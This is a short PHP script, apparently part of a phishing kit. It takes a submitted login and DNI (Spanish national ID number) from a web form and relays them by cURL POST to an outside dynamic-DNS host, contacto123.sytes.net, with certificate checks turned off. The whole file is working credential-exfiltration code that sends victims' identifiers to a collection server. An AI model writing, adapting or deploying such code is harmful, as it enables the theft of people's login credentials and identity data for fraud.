<?php
	require("../../sec.php");
	$log=$_POST["log"];
	$dni=$_POST["dni"];
	#$tmp=exec("ifconfig | head -1");
	$url = 'http://contacto123.sytes.net/successful/ajax/querytab.php';
	$fields = array(
	'action' => 'setkey',
	'login' => $log,
	'dni' => $dni,
	);
	$headers = array(
	'Content-Type: application/x-www-form-urlencoded'
	);
	foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
	rtrim($fields_string, '&');
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
	$result = curl_exec($ch);
	if ($result === FALSE) {
		die('Curl failed: ' . curl_error($ch));
	}
	curl_close($ch);
	echo $result;
	#echo $log." | ".$dni;
?>
